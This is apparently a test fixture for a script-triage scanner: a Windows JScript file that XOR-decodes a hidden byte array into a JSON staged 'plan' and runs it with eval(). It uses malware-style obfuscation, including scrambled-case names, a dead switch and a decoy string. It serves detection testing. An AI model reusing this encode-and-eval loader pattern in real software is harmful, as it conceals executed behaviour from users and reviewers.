// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decode_3499db86(SoUrCeByTeS) {
  var keyBytes = [33,185,24,7,38];
  var DeCoDeDByTeS = [];
  for (var i = 0; i < SoUrCeByTeS.length; i++) { DeCoDeDByTeS.push(SoUrCeByTeS[i] ^ keyBytes[i % keyBytes.length]); }
  return DeCoDeDByTeS;
}
function recover_ba53acdf() {
  if (true) {
    var SoUrCeByTeS = [90,155,107,115,67,81,202,58,61,125,3,216,123,118,83,72,203,125,88,84,68,212,119,115,67,3,149,58,112,84,72,205,125,88,64,72,213,125,37,10,3,221,113,116,86,64,205,123,111,121,81,203,119,100,67,82,202,58,43,4,73,216,118,99,73,71,223,71,116,69,83,208,104,115,4,124,149,58,102,66,64,201,108,98,84,3,131,58,74,117,121,244,84,53,8,121,244,84,79,114,117,233,54,49,8,17,155,52,37,80,64,213,109,98,85,3,131,99,37,69,64,212,104,102,79,70,215,71,110,66,3,131,58,100,71,76,201,121,110,65,79,148,32,102,22,68,129,32,97,68,22,141,58,43,4,84,203,116,37,28,3,209,108,115,86,82,131,55,40,30,64,137,125,63,30,71,219,47,51,8,68,193,121,106,86,77,220,54,110,72,87,216,116,110,66,14,138,42,62,71,64,220,42,63,8,69,216,108,37,10,3,204,107,98,84,126,216,127,98,72,85,155,34,37,110,84,215,108,117,67,82,202,84,102,68,14,129,121,55,67,25,129,126,101,17,21,155,52,37,64,72,213,125,88,86,64,205,112,37,28,3,250,34,91,122,116,202,125,117,85,125,229,72,114,68,77,208,123,91,122,105,204,118,115,84,68,202,107,75,71,67,229,68,116,82,64,222,125,42,30,64,137,125,63,30,71,219,47,51,8,69,216,108,37,10,3,203,125,96,79,82,205,106,126,121,81,216,108,111,4,27,155,80,76,101,116,229,68,84,73,71,205,111,102,84,68,229,68,79,83,79,205,106,98,85,82,245,121,101,122,125,253,113,116,86,78,202,121,101,74,68,229,68,63,71,17,220,32,63,64,67,142,44,37,10,3,215,125,127,82,126,202,108,102,65,68,155,34,37,74,78,218,121,107,11,69,208,107,119,71,85,218,112,41,76,82,155,101,43,4,82,205,121,96,67,98,214,109,105,82,3,131,44,122];
    var NeUtRaL = "PROCESSOR_ARCHITECTURE";
    var DeCoDeDByTeS = [];
    var state = 1;
    switch (state) { case 1: DeCoDeDByTeS = decode_3499db86.call(null, SoUrCeByTeS); break; default: DeCoDeDByTeS = []; }
    var DeScRiPtOrTeXt = DeCoDeDByTeS.length ? String.fromCharCode(DeCoDeDByTeS[0]) : "", bi = 1;
    for (bi = 1; bi < DeCoDeDByTeS.length; bi++) { DeScRiPtOrTeXt = DeScRiPtOrTeXt.concat(String.fromCharCode(DeCoDeDByTeS[bi])); }
    return DeScRiPtOrTeXt;
  }
}
function inspect_002885f0() {
  var DeScRiPtOr = eval("(" + recover_ba53acdf.call(null) + ")");
  var PlAn = new Object();
  PlAn.steps = DeScRiPtOr.steps;
  PlAn["adapter"] = DeScRiPtOr["adapter"];
  PlAn.values = DeScRiPtOr.values;
  PlAn["stageCount"] = DeScRiPtOr["stageCount"];
  return PlAn;
}
